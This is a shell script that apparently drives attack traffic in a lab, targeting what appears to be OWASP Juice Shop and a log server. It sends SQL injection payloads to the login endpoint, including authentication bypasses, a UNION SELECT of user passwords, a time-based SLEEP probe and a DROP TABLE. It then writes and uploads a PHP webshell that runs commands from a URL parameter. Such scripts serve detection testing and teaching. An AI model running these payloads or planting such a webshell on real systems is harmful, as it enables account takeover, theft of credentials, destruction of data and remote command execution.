#!/bin/sh
# attacks/run_attacks.sh (SQLi variants + upload + UA)
# - Send multiple SQL Injection payloads to Juice Shop login endpoint
# - Upload a PHP webshell to the log server upload endpoint
# - Send request with suspicious User-Agent to log server
# - Clean up temporary files

set -eu

# ---- config ----
JUICE_HOST="http://juice:3000"
SQLI_ENDPOINT="${JUICE_HOST}/rest/user/login"
LOGSRV_UPLOAD_URL="http://logsrv:80/uploads"
UA="Mozilla/5.0 (evil-scanner)"
MAX_SNIPPET_BYTES=800
WAIT_TIMEOUT=30
# -----------------

# ensure curl available
if ! command -v curl >/dev/null 2>&1; then
  echo "[!] curl not found in PATH. Exiting."
  exit 0
fi

# wait for Juice Shop to be reachable
START=$(date +%s)
while true; do
  if curl -sS --max-time 2 "${JUICE_HOST}/" >/dev/null 2>&1; then
    echo "[*] Juice Shop reachable"
    break
  fi
  NOW=$(date +%s)
  if [ $((NOW - START)) -ge $WAIT_TIMEOUT ]; then
    echo "[!] Timeout waiting for Juice Shop (continuing anyway)"
    break
  fi
  echo "[*] Waiting for Juice Shop..."
  sleep 1
done

echo "[*] Preparing SQLi payloads..."
i=0

# payloads creation
i=$((i+1))
cat > /tmp/payload_${i}.json <<'EOF'
{"email":"admin@example.com'"' OR 1=1 --","password":"x"}
EOF

i=$((i+1))
cat > /tmp/payload_${i}.json <<'EOF'
{"email":"admin@example.com OR 1=1","password":"x"}
EOF

i=$((i+1))
cat > /tmp/payload_${i}.json <<'EOF'
{"email":"admin' UNION SELECT username, password FROM Users --","password":"x"}
EOF

i=$((i+1))
cat > /tmp/payload_${i}.json <<'EOF'
{"email":"admin' OR SLEEP(5) --","password":"x"}
EOF

i=$((i+1))
cat > /tmp/payload_${i}.json <<'EOF'
{"email":"admin'; DROP TABLE users; --","password":"x"}
EOF

i=$((i+1))
cat > /tmp/payload_${i}.json <<'EOF'
{"email":"alice' -- ","password":"x"}
EOF

TOTAL=$i
echo "[*] Prepared ${TOTAL} SQLi payloads."

# send payloads
for p in $(seq 1 $TOTAL); do
  PAYLOAD_FILE="/tmp/payload_${p}.json"
  RESP_FILE="/tmp/resp_${p}.txt"
  echo "[*] Sending payload ${p}/${TOTAL} -> ${PAYLOAD_FILE}"
  HTTP_CODE=$(curl -sS -o "${RESP_FILE}" -w "%{http_code}" -X POST -H "Content-Type: application/json" --data-binary @"${PAYLOAD_FILE}" "${SQLI_ENDPOINT}" || echo "000")
  echo "[*] HTTP code: ${HTTP_CODE}"
  echo "[*] Response snippet (first ${MAX_SNIPPET_BYTES} bytes):"
  if [ -s "${RESP_FILE}" ]; then
    head -c ${MAX_SNIPPET_BYTES} "${RESP_FILE}" || true
    echo
  else
    echo "(empty response body)"
  fi
done

# create webshell
TS="$(date +%s)"
SHELL_NAME="shell_${TS}.php"
TMP="/tmp/${SHELL_NAME}"
echo "<?php system(\$_GET['cmd']); ?>" > "${TMP}"
echo "[*] Created webshell ${TMP}"

# upload webshell
HTTP_CODE=$(curl -sS -o /tmp/upload_resp -w "%{http_code}" -X PUT --data-binary @"${TMP}" "${LOGSRV_UPLOAD_URL}/${SHELL_NAME}" || echo "000")
echo "[*] Upload HTTP code: ${HTTP_CODE}"

# suspicious UA request
curl -sS -A "${UA}" "${LOGSRV_UPLOAD_URL%/uploads/}" >/dev/null 2>&1 || true

# cleanup
rm -f /tmp/payload_*.json /tmp/resp_*.txt /tmp/upload_resp "${TMP}" || true

echo "[*] Attacks done. Uploaded: ${SHELL_NAME}"
